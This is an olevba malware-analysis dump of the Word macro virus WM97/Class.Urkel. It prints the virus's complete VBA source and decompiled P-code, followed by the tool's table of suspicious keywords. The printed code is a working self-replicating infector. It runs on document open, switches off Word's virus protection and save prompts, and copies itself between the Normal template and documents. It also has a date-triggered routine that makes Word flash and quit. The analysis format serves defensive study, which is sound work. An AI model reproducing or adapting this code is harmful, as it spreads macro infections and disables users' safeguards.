olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.u
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.u - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo 75

I = 0

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

If Day(13) And Month(11) Then Call AutoCrazy

ux = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

xu = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If xu > 94 And ux > 0 Then GoTo 75

If xu < 94 Then

 Set bg = NormalTemplate.VBProject.VBComponents.Item(1)

 ActiveDocument.VBProject.VBComponents.Item(1).Name = bg.Name

 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\urkel.sys"

End If

If ux = 0 Then Set bg = ActiveDocument.VBProject.VBComponents.Item(1)

 Infection = Int(Rnd * 50)

 If Infection = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(85) + Chr(82) + Chr(75) + Chr(69) + Chr(76) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

 bg.codemodule.AddFromFile ("c:\urkel.sys")

 With bg.codemodule

    For x = 1 To 4

    .deletelines 1

    Next x

 End With
  
 If xu < 94 Then

    With bg.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 99, "Sub ToolsMacro()"
       
    rd = Int(Rnd * 100)

If rd = 99 Then .replaceline 69, ".replaceline x, ""'"" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
    
End With

 End If

 With bg.codemodule

    For x = 2 To 96 Step 2

    .replaceline x, "'" & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow

    Next x

 End With

75:

 If xu > 94 And ux = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Private Sub AutoCrazy()

Top:

I = I + 1

On Error Resume Next

Application.WindowState = wdWindowStateMinimize

Application.WindowState = wdWindowStateMaximize

If I < 10 Then GoTo Top

Application.Quit

End Sub

Sub ViewVBCode()
'WM97/Class.Urkel by Virus, HI Vic.
End Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.u
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4824 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	OnError 75 
' Line #3:
' Line #4:
' 	LitDI2 0x0000 
' 	St I 
' Line #5:
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #11:
' Line #12:
' 	LitDI2 0x000D 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000B 
' 	ArgsLd Month 0x0001 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) AutoCrazy 0x0000 
' 	EndIf 
' Line #13:
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ux 
' Line #15:
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St xu 
' Line #17:
' Line #18:
' 	Ld xu 
' 	LitDI2 0x005E 
' 	Gt 
' 	Ld ux 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 75 
' 	EndIf 
' Line #19:
' Line #20:
' 	Ld xu 
' 	LitDI2 0x005E 
' 	Lt 
' 	IfBlock 
' Line #21:
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bg 
' Line #23:
' Line #24:
' 	Ld bg 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #25:
' Line #26:
' 	LitStr 0x000C "c:\urkel.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	Ld ux 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bg 
' 	EndIf 
' Line #31:
' Line #32:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St Infection 
' Line #33:
' Line #34:
' 	Ld Infection 
' 	LitDI2 0x0031 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #35:
' Line #36:
' 	LitStr 0x000C "c:\urkel.sys"
' 	Paren 
' 	Ld bg 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #37:
' Line #38:
' 	StartWithExpr 
' 	Ld bg 
' 	MemLd codemodule 
' 	With 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #41:
' Line #42:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #43:
' Line #44:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' Line #46:
' 	EndWith 
' Line #47:
' Line #48:
' 	Ld xu 
' 	LitDI2 0x005E 
' 	Lt 
' 	IfBlock 
' Line #49:
' Line #50:
' 	StartWithExpr 
' 	Ld bg 
' 	MemLd codemodule 
' 	With 
' Line #51:
' Line #52:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #53:
' Line #54:
' 	LitDI2 0x0063 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #55:
' Line #56:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St rd 
' Line #57:
' Line #58:
' 	Ld rd 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0045 
' 	LitStr 0x008B ".replaceline x, "'" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
' 	ArgsMemCallWith replaceline 0x0002 
' 	EndIf 
' Line #59:
' Line #60:
' 	EndWith 
' Line #61:
' Line #62:
' 	EndIfBlock 
' Line #63:
' Line #64:
' 	StartWithExpr 
' 	Ld bg 
' 	MemLd codemodule 
' 	With 
' Line #65:
' Line #66:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0060 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #67:
' Line #68:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd DisplayRecentFiles 
' 	Concat 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #69:
' Line #70:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' Line #72:
' 	EndWith 
' Line #73:
' Line #74:
' 	LineNum 75 
' 	BoS 0x0000 
' Line #75:
' Line #76:
' 	Ld xu 
' 	LitDI2 0x005E 
' 	Gt 
' 	Ld ux 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #77:
' Line #78:
' 	EndSub 
' Line #79:
' Line #80:
' 	FuncDefn (Private Sub AutoCrazy())
' Line #81:
' Line #82:
' 	Label Top 
' Line #83:
' Line #84:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #85:
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' Line #88:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #89:
' Line #90:
' 	Ld wdWindowStateMaximize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #91:
' Line #92:
' 	Ld I 
' 	LitDI2 0x000A 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo Top 
' 	EndIf 
' Line #93:
' Line #94:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #95:
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' 	FuncDefn (Sub ViewVBCode())
' Line #99:
' 	QuoteRem 0x0000 0x0022 "WM97/Class.Urkel by Virus, HI Vic."
' Line #100:
' 	EndSub 
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

